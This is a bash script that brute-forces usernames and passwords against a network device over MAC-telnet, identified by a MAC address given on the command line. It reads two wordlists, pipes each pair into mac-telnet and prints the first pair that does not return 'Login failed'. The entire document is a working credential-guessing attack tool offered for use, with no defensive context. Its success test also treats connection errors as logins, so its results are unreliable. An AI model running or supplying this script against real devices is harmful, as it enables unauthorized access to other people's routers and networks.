#!/bin/bash

MAC=$1
USER_WORDLIST="user.txt"
PASS_WORDLIST="pass.txt"

if [[ -z "$MAC" ]]; then
  echo "Usage: $0 <MAC_ADDRESS>"
  exit 1
fi

echo "[*] Starting MAC brute-force on $MAC..."
echo "[*] Trying..."

for USER in $(cat $USER_WORDLIST); do
  for PASS in $(cat $PASS_WORDLIST); do
    echo "$USER
$PASS
quit" | mac-telnet "$MAC" 2>/dev/null | grep -q "Login failed"

    if [[ $? -ne 0 ]]; then
      echo "[+] SUCCESS! Username: $USER | Password: $PASS"
      exit 0
    fi
  done
done

echo "[-] No valid credentials found."
